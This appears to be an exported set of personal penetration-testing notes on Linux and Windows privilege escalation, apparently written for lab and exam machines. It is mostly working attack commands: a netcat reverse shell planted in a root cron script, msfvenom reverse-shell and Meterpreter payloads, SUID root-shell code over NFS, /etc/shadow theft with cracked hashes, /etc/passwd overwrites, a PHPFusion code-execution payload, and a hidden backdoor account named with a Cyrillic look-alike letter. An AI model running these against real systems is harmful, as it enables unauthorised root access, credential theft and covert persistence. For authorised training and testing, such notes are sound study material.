2&gt;/dev/null to redirect errors to /dev/null:</span></p><p>getcap -r / 2&gt;/dev/null</p><p></p><p></p><p><img src="images/85-1.png" alt="images/85-1.png" /></p><p><span style="color:#234141;">in this example we found a vim capabilities binary. Thankfully gtfobins had a powerful binary for it.</span></p><p></p><p></p><p>./vim -c &#39;:py3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</p><p><img src="images/85-2.png" alt="images/85-2.png" /></p><p></p><p><img src="images/85-3.png" alt="images/85-3.png" /></p><p></p><p><span style="color:#234141;">Misconfigurations are quite lovely sometimes :)</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Capabilities--openssl_430.html"></a><h1 class='title level-7'>openssl</h1><br/><p><a href="https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/">https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</a></p><p></p><p>getcap -r / 2&gt;/dev/null</p><p>we see openssl capabilities</p><p><a href="https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/">https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</a></p><p></p><p>compile on our box and run on target. </p><p></p><p><img src="images/430-1.png" alt="images/430-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Capabilities--tar_439.html"></a><h1 class='title level-7'>tar</h1><br/><p><strong><h3>nxnjz@test-machine:~$ getcap -r / 2&gt;/dev/null</h3></strong><h3></h3></p><p><h3>/home/nxnjz/tar = cap_dac_read_search+ep</h3><h3></h3></p><p><h3>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</h3><h3></h3></p><p><h3>/usr/bin/mtr-packet = cap_net_raw+ep</h3></p><p><h3> </h3></p><p><h3>An unusual finding: tar has cap_dac_read_search capabilities. This means it has read access to anything. We could use this to read SSH keys, or /etc/shadow and get password hashes.</h3></p><p><h3>/etc/shadow is usually only readable by root:</h3></p><p><strong><h3>nxnjz@test-machine:~$ cat /etc/shadow</h3></strong><h3></h3></p><p><h3>cat: /etc/shadow: Permission denied</h3></p><p><h3> </h3></p><p><h3>But since tar has that capability, we can archive /etc/shadow, extract it from the archive and read it.</h3></p><p><strong><h3>nxnjz@test-machine:~$ ls</h3></strong><h3></h3></p><p><h3>tar</h3><h3></h3></p><p><h3></h3><strong><h3>nxnjz@test-machine:~$ ./tar -cvf shadow.tar /etc/shadow</h3></strong><h3></h3></p><p><h3>./tar: Removing leading `/’ from member names</h3><h3></h3></p><p><h3>/etc/shadow</h3><h3></h3></p><p><h3></h3><strong><h3>nxnjz@test-machine:~$ ls</h3></strong><h3></h3></p><p><h3>shadow.tar tar</h3><h3></h3></p><p><h3></h3><strong><h3>nxnjz@test-machine:~$ ./tar -xvf shadow.tar</h3></strong><h3></h3></p><p><h3>etc/shadow</h3><h3></h3></p><p><h3></h3><strong><h3>nxnjz@test-machine:~$ ls</h3></strong><h3></h3></p><p><h3>etc shadow.tar tar</h3><h3></h3></p><p><h3></h3><strong><h3>nxnjz@test-machine:~$ cat etc/shadow</h3></strong><h3></h3></p><p><h3>root:$1$xyz$Bf.3hZ4SmETM3A78n1nWr.:17735:0:99999:7:::</h3><h3></h3></p><p><h3>daemon:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>bin:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>sys:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>sync:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>games:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>man:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>lp:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>mail:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>news:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>uucp:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>proxy:*:17729:0:99999:7:::</h3><h3></h3></p><p><h3>nxnjz:$1$sTfA$SnnNO9Cflvs4aq4ZCU/6J/:17764:0:99999:7:::</h3></p><p><h3> </h3></p><p><h3>After cracking that password hash for root, which turns out to be ‘root1234’, we can login using su:</h3></p><p><strong><h3>nxnjz@test-machine:~$ su root</h3></strong><h3></h3></p><p><h3>Password:</h3><h3></h3></p><p><h3></h3><strong><h3>root@test-machine:/home/nxnjz# whoami</h3></strong><h3></h3></p><p><h3>root</h3></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Cron_jobs_86.html"></a><h1 class='title level-6'>Cron jobs</h1><br/><p><span style="color:#234141;">See which cron jobs are running:</span></p><p></p><p><span style="color:#3f4043;">Check cronjobs:</span></p><p>cat /etc/crontab</p><p>ls /etc/cron*</p><p>cat /etc/cron*</p><p>cat /etc/cron.d</p><p>cat /var/spool/cron/*</p><p></p><p><span style="color:#234141;">If a cron job is running as root, and we have write capabilities to a file we can then change the content of the file to a reverse shell for instance. And when the cron job is running that file again, but now with a reverse shell code getting executed, we will now get root access in the reverse shell listener on the attacking host. </span></p><p></p><p>echo &#39;mkfifo /tmp/lcbo; nc 10.13.31.108 443 0&lt;/tmp/lcbo | /bin/sh &gt;/tmp/lcbo 2&gt;&amp;1; rm /tmp/lcbo&#39; &gt; autoscript.sh</p><p></p><p><span style="color:#3f4043;">when cronjob triggers.... we&#39;ll get a shell.</span></p><p></p><p><span style="color:#234141;">(worth noting is that cron jobs usually arent as frequent in a more realistic environment in comparison to boxes like these)</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Writable_Root_PATH_87.html"></a><h1 class='title level-6'>Writable Root PATH</h1><br/><p><a href="https://www.youtube.com/watch?v=TrOf9RfFxQk">https://www.youtube.com/watch?v=TrOf9RfFxQk</a></p><p><ol><li>1. <span style="color:#234141;">1. What folders are located under $PATH</span></li><li><span style="color:#234141;">Does your current user have write privileges for any of these folders?</span></li><li><span style="color:#234141;">Can you modify $PATH?</span></li><li><span style="color:#234141;">Is there a script/application you can start that will be affected by this vulnerability?</span></li></ol><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">NB: No where done with this page. </span></p><p></p><p></p><p>echo $PATH</p><p></p><p>find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</p><p></p><p>export PATH=/tmp:$PATH</p><p></p><p></p><p></p><p>strings /usr/bin/uustat</p><p><img src="images/87-1.png" alt="images/87-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--NFS_88.html"></a><h1 class='title level-6'>NFS</h1><br/><p><a href="https://resources.infosecinstitute.com/topic/exploiting-nfs-share/">https://resources.infosecinstitute.com/topic/exploiting-nfs-share/</a></p><p></p><p><span style="color:#3f4043;">Network File Sharing</span></p><p></p><p>showmount -e 10.10.28.220    <span style="color:#3f4043;">(shows mountable shares on victim, from our attacking machine)</span></p><p></p><p>cat /etc/exports   <span style="color:#3f4043;">  (Shows info about the NFS. Unless one of the shares doesn&#39;t have both rw, and no_root_squash, it will not work)</span></p><p></p><p><span style="color:#3f4043;">Let&#39;s proceed..</span></p><p></p><p>mkdir /tmp/attacker-backups (obviously on attacking machine)</p><p></p><p>mount -o rw 10.10.28.220:/home/ubuntu/sharefolder /tmp/attacker-backups </p><p><span style="color:#3f4043;">(so this created a link between our attacker-backups folder and their sharefolder. From here, we can get pretty malicious).</span></p><p></p><p>nano nfs.c   <span style="color:#3f4043;">(so here we&#39;re just creating a simple script that spawns a root shell if executed on victim)</span></p><p></p><p><span style="color:#ff0000;">int main()</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">{ setuid(0);</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">  setgid(0);</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">  system(&quot;/bin/bash&quot;);</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">  return 0;</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">}</span></p><p></p><p>gcc nfs.c -o nfs -w  <span style="color:#3f4043;">(here we&#39;re just compiling this c program and we&#39;re calling it nfs)</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></p><p>chmod +s nfs    <span style="color:#3f4043;"> (this sets the SUID bit)</span></p><p></p><p><span style="color:#3f4043;">from here we just run the script like so: </span>./nsf   <span style="color:#3f4043;">on victim machine and as we&#39;ve already established connection to the NFS and share had both rw and no_root_squash, so when we compiled the c program, the newly compiled “nsf” file will arrive at victim, so no reason for file transfer.  </span></p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--NFS--no_root_squash_268.html"></a><h1 class='title level-7'>no_root_squash</h1><br/><p><a href="https://medium.com/vieh-group/hacking-oscp-cheatsheet-ef63c43f919c">https://medium.com/vieh-group/hacking-oscp-cheatsheet-ef63c43f919c</a></p><p><span style="color:#3f4043;">search for NFS</span></p><p></p><p>ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049</p><p></p><p>mkdir my_share</p><p>mount -t nfs 127.0.0.1:/srv/share my_share</p><p>cd my_share</p><p></p><p>gedit shell.c</p><p><span style="color:#ed333b;">#include &lt;unistd.h&gt;</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">int main(){</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">  setuid(0);</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">  setgid(0);</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">  system(&quot;/bin/bash&quot;);</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">}</span></p><p></p><p><span style="color:#3f4043;">make sure you&#39;re root on your kali</span></p><p></p><p>gcc shell.c -o shell</p><p>chmod u+s shell</p><p></p><p><span style="color:#3f4043;">Then ssh back in. Go to the share they hosted. </span></p><p></p><p><span style="color:#3f4043;">Trigger the script</span></p><p></p><p>./shell</p><p></p><p><span style="color:#3f4043;">root :) &lt;3</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--NFS--Library_Hijack_406.html"></a><h1 class='title level-7'>Library Hijack</h1><br/><p><span style="text-decoration:underline;">We saw root execute this script through python essentially. We couldn&#39;t do anything with the script, but we saw ftplib library, and given our group permission, we were able to replace the original ftplib.py my moving it and then making our own with os.commands inserted. </span><span style="text-decoration:underline;"></span></p><p><span style="text-decoration:underline;"></span><span style="text-decoration:underline;"></span></p><p><span style="text-decoration:underline;">Then when root tries to execute ftpclient.py through python, the library it depends on will be exucute through the context of root as well. And as a result, we&#39;re able to get a root session.</span></p><p></p><p></p><p></p><p><img src="images/406-1.png" alt="images/406-1.png" /></p><p></p><p><img src="images/406-2.png" alt="images/406-2.png" /></p><p></p><p>So now we see if can perform library hijacking. </p><p></p><p>So we cannot write or execute this file, but we are apparently allowed to move it. Should be innocent enough, right? Right? ;))))</p><p><img src="images/406-3.png" alt="images/406-3.png" /></p><p></p><p>Edit new file:</p><p><img src="images/406-4.png" alt="images/406-4.png" /></p><p></p><p>Now, since we know root is running python 2.7 and executing the ftpclient.py script, which again, contains ftplib as a library, we can hijack that library path given our group permissions. </p><p></p><p><img src="images/406-5.png" alt="images/406-5.png" /></p><p></p><p>And we are root, yummy ;)</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Executable_File_with_Dependency_Hijack_322.html"></a><h1 class='title level-6'>Executable File with Dependency Hijack</h1><br/><p><span style="color:#3f4043;">So in this attack we inspect a root-owned file we can execute and see if it makes use of any applications inside script we can do Enivonment hijacking on. Essentially making an malicous payload with exact same name as application inside script, and then making sure our payload triggers before the actual application using environment path modifications. </span></p><p></p><p><span style="color:#3f4043;">Here&#39;s the file we found:</span></p><p><img src="images/322-1.png" alt="images/322-1.png" /></p><p></p><p><span style="color:#3f4043;">Inspecting the script (most of it is bianry junk) we can see it relyes on the scp binary. Since it doesn&#39;t specify full path in script, we can hijack this after modifying path. (remember we can use the strings command to read these files better)</span></p><p><img src="images/322-2.png" alt="images/322-2.png" /></p><p></p><p><span style="color:#3f4043;">Create our payload from kali: (notice its name)</span></p><p>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f elf -o scp</p><p></p><p><span style="color:#3f4043;">Upload it to /tmp, and give it full permisisons.</span></p><p>chmod 755 scp</p><p><span style="color:#3f4043;">or just exetuable should do the trick</span></p><p>chmod +x scp</p><p></p><p><span style="color:#3f4043;">Making /tmp trigger first in environment path:</span></p><p>export PATH=/tmp:$PATH</p><p></p><p></p><p><span style="color:#3f4043;">Now, we can execute original script, and since root is it&#39;s owner, our new session will be root too</span></p><p></p><p><img src="images/322-3.png" alt="images/322-3.png" /></p><p></p><p><span style="color:#3f4043;">euid is essentially what matters. We have full access now. Awesome!</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common_255.html"></a><h1 class='title level-6'>less common</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--LXD_Alpine_UID_privesc_90.html"></a><h1 class='title level-7'>LXD Alpine UID privesc</h1><br/><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><p></p><p><span style="color:#404040;">get the file over to victim:</span></p><p>curl <a href="http://10.9.0.77:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz">http://10.9.0.77:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</a> -o /tmp/alpine-v3.13-x86_64-20210218_0139.tar.gz</p><p></p><p>lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage</p><p></p><p>lxc init myimage ignite -c security.privileged=true</p><p></p><p>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</p><p></p><p>lxc start ignite</p><p></p><p>lxc exec ignite /bin/sh</p><p></p><p><img src="images/90-1.png" alt="images/90-1.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--Meterpreter_shell_91.html"></a><h1 class='title level-7'>Meterpreter shell</h1><br/><p>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.9.3.155 LPORT=9001 -f elf &gt; pwned.elf</p><p></p><p><span style="color:#404040;">This created an .elf file you can use to send to the victim machine, than trigger a reverse shell from there to get a meterpreter shell. Allow me to elaborate: </span></p><p></p><p>msfconsole</p><p><span style="color:#ff0000;">use multi/handler</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">set payload linux/x64/meterpreter_reverse_tcp</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">set LHOST 10.9.3.55</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">set LPORT 9001</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">run</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--writeable_-etc-passwd_256.html"></a><h1 class='title level-7'>writeable /etc/passwd</h1><br/><p><span style="color:#3f4043;">TLDR: Adding a weak password to root user in /etc/passwd and switing to root with that weak password we set to become root.</span></p><p></p><p><span style="color:#3f4043;">I ran linpeas... and I see writeable /etc/passwd!</span></p><p></p><p><span style="color:#3f4043;">I ran openssl passwd dog (this created an openssl password that I will be adding in the /etc/passwd file to overwrite root password)</span></p><p><img src="images/256-1.png" alt="images/256-1.png" /></p><p></p><p>openssl passwd dog</p><p><span style="color:#3f4043;">0486BQxfS41ZQ</span></p><p><span style="color:#3f4043;">I copy all of the victim machine&#39;s /etc/passwd content and add the the “0486BQxfS41Z” in root, like so:</span></p><p></p><p><span style="color:#3f4043;">(this way more convenient)</span></p><p>openssl passwd dog</p><p>echo &#39;test2:xp4.jYZ9NhWWo:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd</p><p>su test2 </p><p>dog</p><p></p><p>root</p><p></p><p><img src="images/256-2.png" alt="images/256-2.png" /></p><p></p><p>Now, copy paste all of this, and write: echo &#39;root:0486BQxfS41ZQ:0:0:root:/root:/bin/bash</p><p>bin:x:1:1:bin:/bin:/sbin/nologin</p><p>daemon:x:2:2:daemon:/sbin:/sbin/nologin</p><p>adm:x:3:4:adm:/var/adm:/sbin/nologin</p><p>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</p><p>sync:x:5:0:sync:/sbin:/bin/sync</p><p>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</p><p>halt:x:7:0:halt:/sbin:/sbin/halt</p><p>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</p><p>operator:x:11:0:operator:/root:/sbin/nologin</p><p>games:x:12:100:games:/usr/games:/sbin/nologin</p><p>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</p><p>nobody:x:99:99:Nobody:/:/sbin/nologin</p><p>avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin</p><p>dbus:x:81:81:System message bus:/:/sbin/nologin</p><p>polkitd:x:999:998:User for polkitd:/:/sbin/nologin</p><p>tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin</p><p>postfix:x:89:89::/var/spool/postfix:/sbin/nologin</p><p>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</p><p>jerry:x:1003:1003:jerry:/var/jerry:/bin/bash</p><p>systemd-bus-proxy:x:998:996:systemd Bus Proxy:/:/sbin/nologin</p><p>systemd-network:x:997:995:systemd Network Management:/:/sbin/nologin</p><p>apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</p><p>mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</p><p>otrs:x:1004:1004:OTRS user:/opt/otrs/:/bin/bash</p><p>nginx:x:996:993:Nginx web server:/var/lib/nginx:/sbin/nologin&#39; &gt; /etc/passwd </p><p></p><p></p><p><span style="color:#3f4043;">to overwrite that file since we have write permission to it, which is obviously a bad security flaw. </span></p><p></p><p><span style="color:#3f4043;">Now, we change to root and use our made up password.</span></p><p></p><p></p><p><img src="images/256-3.png" alt="images/256-3.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--mysql_4.x-5.0_privesc_259.html"></a><h1 class='title level-7'>mysql 4.x/5.0 privesc</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--Escaping_RBASH_283.html"></a><h1 class='title level-7'>Escaping RBASH</h1><br/><p>identify restricted environment:</p><p><a href="https://blog.certcube.com/restricted-shells-escaping-techniques/">https://blog.certcube.com/restricted-shells-escaping-techniques/</a></p><p></p><p><a href="https://github.com/R0B1NL1N/OSCP-note/blob/master/gain%20access/shells/spawn_shell_or%20break_out_of_jail.txt">https://github.com/R0B1NL1N/OSCP-note/blob/master/gain%20access/shells/spawn_shell_or%20break_out_of_jail.txt</a></p><p></p><p>awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</p><p></p><p>ssh -t alfred@10.11.1.101 bash</p><p>ssh -t alfred@10.11.1.101 “bash --noprofile -i”</p><p>ssh -t alfred@10.11.1.101 -t &quot;() { :; }; sh -i &quot;</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--Escaping_RBASH--Lshell_340.html"></a><h1 class='title level-8'>Lshell</h1><br/><p><a href="https://www.aldeid.com/wiki/Lshell">https://www.aldeid.com/wiki/Lshell</a></p><p></p><p>echo os.system(&#39;/bin/bash&#39;)</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--docker_group_315.html"></a><h1 class='title level-7'>docker group</h1><br/><p><a href="https://www.youtube.com/watch?v=pRBj2dm4CDU">https://www.youtube.com/watch?v=pRBj2dm4CDU</a></p><p></p><p>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</p><p></p><p>root</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--Unshadow_technique_89.html"></a><h1 class='title level-7'>Unshadow technique</h1><br/><p><a href="https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/">https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/</a></p><p></p><p><span style="color:#404040;">copy /etc/passwd to passwd.txt</span><span style="color:#404040;"></span></p><p><span style="color:#404040;">copy /etc/shadow to shadow.txt</span></p><p></p><p>unshadow passwd.txt shadow.txt &gt; passwords.txt </p><p></p><p>john passwords.txt</p><p></p><p><span style="color:#404040;">if john manages to crack any of them, start enumerating those machines for the previous priv-esc techniques for trying to eventually get full access</span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--PHPFusion_9.03.50_331.html"></a><h1 class='title level-7'>PHPFusion 9.03.50</h1><br/><p><a href="https://www.exploit-db.com/exploits/49911">https://www.exploit-db.com/exploits/49911</a></p><p></p><p><span style="color:#3f4043;">For privesc purposes check what potential port it might be listening on.</span></p><p>ss -lntu</p><p>netstat -ano</p><p></p><p><span style="color:#3f4043;">or check if it&#39;s somewhere under processes</span></p><p>ps aux </p><p></p><p></p><p><span style="color:#3f4043;">We can ofc tell the script to show us a simple whoami for POC sake.</span></p><p><img src="images/331-1.png" alt="images/331-1.png" /></p><p>http://IP/files/infusions/downloads/downloads.php?cat_id=$</p><p>{system(base64_decode(aWQK))}</p><p></p><p><img src="images/331-2.png" alt="images/331-2.png" /></p><p></p><p>The normal script tries a reverse shell, but you can do something like giving /bin/bash suid bitset and running it if you&#39;re already on the system.</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--less_common--root_euid_to_root_uid_615.html"></a><h1 class='title level-7'>root euid to root uid</h1><br/><p>perl -MEnglish -e &#39;$UID = 0; $ENV{PATH} = &quot;/bin:/usr/bin:/sbin:/usr/sbin&quot;; exec &quot;su - root&quot;&#39;</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Attacks--Browser_Credential_Gathering_361.html"></a><h1 class='title level-6'>Browser Credential Gathering</h1><br/><p>Credential gathering:</p><p></p><p>Chromium:</p><p><a href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a></p><p></p><p>Firefox:</p><p><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Persistence_613.html"></a><h1 class='title level-5'>Persistence</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Linux_Privesc--Methodology--Persistence--private_key_614.html"></a><h1 class='title level-6'>private key</h1><br/><p><h3>Adduser ssh persistance:</h3></p><p></p><p>Go from root EUID to root UID:</p><p>perl -MEnglish -e &#39;$UID = 0; $ENV{PATH} = &quot;/bin:/usr/bin:/sbin:/usr/sbin&quot;; exec &quot;su - root&quot;&#39;</p><p></p><p>useradd  -m -s /bin/bash rеdis</p><p>usermod -aG rеdis</p><p>passwd rеdis</p><p>avar112233!</p><p>su rеdis</p><p>ssh-keygen</p><p>rm -dr /home/rеdis</p><p></p><p>ssh rеdis@103.23.61.92 -i id_rsa</p><p></p><p>You can get creative if needed: <a href="https://www.lexilogos.com/keyboard/russian.htm">https://www.lexilogos.com/keyboard/russian.htm</a></p><p></p><p>/home/r\320\265dis/.ssh</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc_24.html"></a><h1 class='title level-3'>Windows Privesc</h1><br/><p></p><p>Check for all the exploits in the exploit section and the manual enumeration too if needed.</p><p></p><p>Take good notes.</p><p></p><p></p><p><h2>Tools:</h2></p><p>wget <a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py">https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py</a></p><p></p><p><span style="color:#3f4043;">If issues with this python script, use the virtualenv environment in ~/virtEnv1/. So cd into ~/virtEnv1/</span>, <span style="color:#3f4043;">then</span> source bin/activate</p><p><span style="color:#3f4043;">If issues with xlrd, do this</span> <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50">https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50</a></p><p><span style="color:#3f4043;">If issues with xlsx with script after changes above, do this </span><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/48">https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/48</a></p><p>==</p><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p><p>==</p><p><a href="https://github.com/PowerShellMafia/PowerSploit.git">https://github.com/PowerShellMafia/PowerSploit.git</a></p><p></p><p><span style="color:#234141;">These are all great. Use them. </span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology_26.html"></a><h1 class='title level-4'>Windows Methodology</h1><br/><p><span style="color:#3f4043;">Privesc Cheat sheets:</span></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#windows---privilege-escalation">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#windows---privilege-escalation</a></p><p><a href="https://gist.github.com/Andross/bf990e87f3594dff58feb385e96c6b12">https://gist.github.com/Andross/bf990e87f3594dff58feb385e96c6b12</a></p><p><a href="https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-privesc.md#startups-and-autoruns">https://github.com/evets007/OSCP-Prep-cheatsheet/blob/master/windows-privesc.md</a></p><p><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a></p><p><a href="https://github.com/xXxhagenxXx/OSCP_Cheat_sheet/blob/main/Windows%20Privilege%20Escalation%20Techniques.md">https://github.com/xXxhagenxXx/OSCP_Cheat_sheet/blob/main/Windows%20Privilege%20Escalation%20Techniques.md</a></p><p><a href="https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842">https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842</a> </p><p><a href="https://blog.thehackingnomad.com/cheat-sheet-series/privesc-windows">https://blog.thehackingnomad.com/cheat-sheet-series/privesc-windows</a></p><p></p><p></p><p><span style="color:#3f4043;">Local privesc series:</span></p><p><a href="https://www.youtube.com/playlist?list=PLBf0hzazHTGMBgq3RXdGDNJjw9iEz-lKz">https://www.youtube.com/playlist?list=PLBf0hzazHTGMBgq3RXdGDNJjw9iEz-lKz</a></p><p></p><p><span style="color:#3f4043;">Some tools:</span></p><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p><p><a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a></p><p><a href="https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1">https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1</a></p><p><a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py">https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py</a></p><p></p><p><span style="color:#234141;">These are all great. Use them. </span></p><p></p><p><span style="color:#3f4043;">Check for all the exploits in the exploit section and the manual enumeration too if needed.</span></p><p></p><p><span style="color:#3f4043;">Take good notes as well.</span></p><p></p><p>whoami /all</p><p></p><p>check c:\ location for silly stuff</p><p></p><p>services (in powershell)</p><p></p><p>ps (in powershell)</p><p></p><p>netstat -ano</p><p>get-process -Id 4916 (powershell, run after u see interesting process from netstat)</p><p></p><p>run powerup </p><p></p><p>run winpeas</p><p></p><p>run windows-exploit-suggester</p><p></p><p>powershell -c &quot;Get-ScheduledTask | where {$_.TaskPath -notlike &#39;\Microsoft*&#39;} | Format-Table TaskName,TaskPath,State&quot;</p><p></p><p>Manually start checking service and file permissions with accesschk</p><p></p><p>Try printnightmare</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Manual_Enumeration_95.html"></a><h1 class='title level-5'>Manual Enumeration</h1><br/><p><h3>User Enumeration:</h3></p><p></p><p>whoami /all</p><p></p><p>systeminfo</p><p> </p><p>net users <span style="color:#404040;">(list users)</span></p><p>net user &lt;username&gt; <span style="color:#3f4043;">(provides additional information about specific user)</span></p><p></p><p>qwinsta <span style="color:#404040;">(checks if other users logged in simultanously)</span></p><p></p><p>net localgroup <span style="color:#404040;">(user groups defined on the system)</span></p><p>net localgroup administrators <span style="color:#3f4043;">(see which users are a part of this group)</span></p><p></p><p><span style="color:#3f4043;">Quickly 